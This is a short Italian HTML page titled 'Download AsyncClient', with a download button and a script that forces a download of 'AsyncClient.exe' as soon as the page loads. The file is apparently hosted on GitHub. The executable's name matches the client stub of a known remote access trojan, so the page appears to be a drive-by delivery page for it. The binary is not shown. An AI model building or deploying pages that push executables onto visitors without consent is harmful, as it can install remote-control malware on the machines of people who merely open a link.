<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download AsyncClient</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f4f4f9;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            display: inline-block;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .btn {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Il download di AsyncClient sta per iniziare...</h1>
        <p>Se il download automatico non parte, clicca sul pulsante verde qui sotto:</p>
        
        <!-- Il nome qui deve essere identico a quello su GitHub -->
        <a href="AsyncClient.exe" download class="btn">Scarica AsyncClient.exe</a>
    </div>

    <script>
        window.onload = function() {
            // Il nome qui deve corrispondere al file caricato su GitHub
            const nomeFile = 'AsyncClient.exe'; 
            
            const link = document.createElement('a');
            link.href = nomeFile;
            link.download = '';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        };
    </script>

</body>
</html>
